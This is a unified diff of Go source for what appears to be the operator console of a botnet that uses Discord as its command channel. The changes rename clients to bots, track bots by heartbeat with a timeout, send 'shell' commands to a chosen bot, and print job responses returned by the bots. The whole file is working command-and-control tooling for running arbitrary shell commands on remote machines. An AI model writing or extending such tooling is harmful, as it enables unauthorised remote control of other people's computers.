@@ -19,7 +19,7 @@ type Job struct {
 	time string
 }
 
-var clients = make(map[string]time.Time)
+var bots = make(map[string]time.Time)
 var jobs []Job
 
 func main() {
@@ -45,12 +45,13 @@ func main() {
 	fmt.Println("Bot is now running.  Press CTRL-C to exit.")
 	sc := make(chan os.Signal, 1)
 	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
-	//<-sc
 
 	scanner := bufio.NewScanner(os.Stdin)
+	print("> ")
 	for scanner.Scan() {
 		input := scanner.Text()
 		if len(input) == 0 {
+			print("> ")
 			continue
 		}
 		var action string
@@ -60,7 +61,7 @@ func main() {
 			if len(input) == len(action) {
 				listJobs()
 			}
-		case "clients":
+		case "bots":
 			fmt.Println("Listing Clients")
 			if len(input) == len(action) {
 				listClients()
@@ -69,8 +70,11 @@ func main() {
 			var target string
 			var command string
 			n, err := fmt.Sscanf(input, "shell %s %q", &target, &command)
-			if err != nil || n != 2 {
-				println("Incorrect \"shell\" arguments", err.Error())
+			if err != nil {
+				fmt.Printf("%s\n> ", err.Error())
+				continue
+			} else if n != 2 {
+				print("Incorrect \"shell\" arguments\n> ")
 				continue
 			}
 			executeShellCommand(target, command, dg)
@@ -80,12 +84,13 @@ func main() {
 		case "savef":
 			fmt.Println("Downloading file")
 		default:
-			fmt.Printf("%s is not a valid command.\n", input)
+			fmt.Printf("%s is not a valid command.\n> ", input)
 			continue
 		}
+		print("> ")
 	}
 
-	fmt.Println("\nClosing")
+	fmt.Println("Closing")
 	// Cleanly close down the Discord session.
 	e := dg.Close()
 	if e != nil {
@@ -101,14 +106,22 @@ func listJobs() {
 	}
 }
 func listClients() {
-	println("Currently Connected Clients:")
-	for clientId, timestamp := range clients {
-		fmt.Printf("JobID: %s\tTime since last ping (s):%d\n", clientId, time.Now().Sub(timestamp)*1000)
+	timeout := (discord.Timeout * time.Second).Seconds()
+	fmt.Printf("================================================================\n" +
+		"Bot ID\t\t\t\t\tTime since last ping(s)\n" +
+		"================================================================\n")
+	for botID, timestamp := range bots {
+		timeSinceLastPing := time.Now().Sub(timestamp).Seconds()
+		if timeSinceLastPing > timeout {
+			delete(bots, botID)
+			continue
+		}
+		fmt.Printf("%s\t%f s\n", botID, timeSinceLastPing)
 	}
 }
 
 func executeShellCommand(target string, command string, dg *discordgo.Session) {
-	message := fmt.Sprintf("%s\n%s\n%s", "shell", target, command)
+	message := fmt.Sprintf("%s\n%s\n%q", target, "shell", command)
 	discord.SendMessage(dg, message)
 }
 
@@ -123,20 +136,32 @@ func downloadFile(filename string) {
 // This function will be called (due to AddHandler above) every time a new
 // message is created on any channel that the autenticated bot has access to.
 func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
-
 	// Ignore all messages created by the bot itself
 	// This isn't required in this specific example but it's a good practice.
 	if m.Author.ID == s.State.User.ID {
 		return
 	}
-	// If the message is "ping" reply with "Pong!"
-	if m.Content == "ping" {
-		discord.SendMessage(s, "Pong!")
+	var (
+		botID    string
+		job      string
+		response string
+	)
+	n, err := fmt.Sscanf(m.Content, "%s\n%q\n%q", &botID, &job, &response)
+	if err != nil {
+		println(err.Error())
+		return
+	} else if n < 2 {
+		println("Poorly formatted message received")
+		return
 	}
-
-	// If the message is "pong" reply with "Ping!"
-	if m.Content == "pong" {
-		discord.SendMessage(s, "Ping!")
+	if job == "Connected" {
+		if _, ok := bots[botID]; ok == false {
+			fmt.Printf("New connection from %s\n", botID)
+		}
+		bots[botID] = time.Now()
+	} else {
+		str := fmt.Sprintf("Job Response:\n\tJob: %s\n\tBotID: %s\n\tResponse: %s", job, botID, response)
+		println(str)
 	}
 }
 
